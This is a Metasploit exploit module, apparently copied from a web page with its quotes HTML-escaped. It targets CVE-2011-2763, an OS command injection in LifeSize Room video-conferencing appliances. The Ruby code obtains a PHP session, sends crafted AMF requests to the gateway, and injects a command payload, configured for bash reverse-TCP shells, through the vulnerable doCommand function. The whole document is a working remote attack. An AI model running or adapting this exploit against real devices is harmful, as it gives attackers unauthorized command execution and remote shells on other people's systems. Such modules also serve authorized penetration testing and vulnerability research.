 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;LifeSize Room Command Injection&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a vulnerable resource in LifeSize
                Room  versions 3.5.3 and 4.7.18 to inject OS commmands.  LifeSize
                Room is an appliance and thus the environment is limited
                resulting in a small set of payload options.
            },
            &#039;Author&#039;    =>
                [
                    &#039;Spencer McIntyre&#039;,
                    # Special Thanks To Chris Murrey
                    &#039;SecureState R&D Team&#039;
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 6 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2011-2763&#039; ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    &#039;Space&#039;       => 65535,  # limited by the two byte size in the AMF encoding
                    &#039;Compat&#039;      =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd cmd_bash&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic bash-tcp&#039;,
                        }
                },
            &#039;Platform&#039;       => [ &#039;unix&#039; ],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        => [ [ &#039;Automatic&#039;, { } ] ],
            &#039;DisclosureDate&#039; => &#039;July 13 2011&#039;,
            &#039;DefaultTarget&#039;  => 0))
             
        register_advanced_options(
            [
                OptString.new(&#039;UserAgent&#039;, [true, &#039;The User-Agent header to use for all requests&#039;, &#039;Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.17) Gecko/20110428 Fedora/3.6.17-1.fc14 Firefox/3.6.17&#039;])
            ], self.class)
 
    end
 
    def exploit
        print_status("Requesting PHP Session...")
        res = send_request_cgi({
            &#039;encode&#039;    =>   false,
            &#039;uri&#039;       =>   "/interface/interface.php?uniqueKey=#{rand_text_numeric(13)}",
            &#039;method&#039;    =>   &#039;GET&#039;,
        }, 10)
        if not res.headers[&#039;set-cookie&#039;]
            print_error(&#039;Could Not Obtain A Session ID&#039;)
            return
        end
         
        sessionid = &#039;PHPSESSID=&#039; << res.headers[&#039;set-cookie&#039;].split(&#039;PHPSESSID=&#039;)[1].split(&#039;; &#039;)[0]
        headers = {
            &#039;Cookie&#039;        => sessionid,
            &#039;Content-Type&#039;  => &#039;application/x-amf&#039;,
        }
         
        print_status("Validating PHP Session...")
        res = send_request_cgi({
                &#039;encode&#039;    => false,
                &#039;uri&#039;       => &#039;/gateway.php&#039;,
                &#039;data&#039;      => "\x00\x00\x00\x00\x00\x02\x00\x1bLSRoom_Remoting.amfphpLogin\x00\x02/1\x00\x00\x00\x05\x0a\x00\x00\x00\x00\x00\x17LSRoom_Remoting.getHost\x00\x02\x2f\x32\x00\x00\x00\x05\x0a\x00\x00\x00\x00",
                &#039;method&#039;    => &#039;POST&#039;,
                &#039;headers&#039;   => headers,
        })
        if not res
            print_error(&#039;Could Not Validate The Session ID&#039;)
            return
        end
         
        print_status("Sending Malicious POST Request...")
        # This is the amf data for the request to the vulnerable function LSRoom_Remoting.doCommand
        amf_data = "\x00\x00\x00\x00\x00\x01\x00\x19LSRoom_Remoting.doCommand\x00\x02\x2f\x37\xff\xff\xff\xff\x0a\x00\x00\x00\x02\x02#{[payload.encoded.length].pack(&#039;n&#039;)}#{payload.encoded}\x02\x00\x0dupgradeStatus"
        res = send_request_cgi({
                &#039;encode&#039;    => false,
                &#039;uri&#039;       => &#039;/gateway.php?&#039; << sessionid,
                &#039;data&#039;      => amf_data,
                &#039;method&#039;    => &#039;POST&#039;,
                &#039;headers&#039;   =>   headers
        }, 10)
    end
     
end



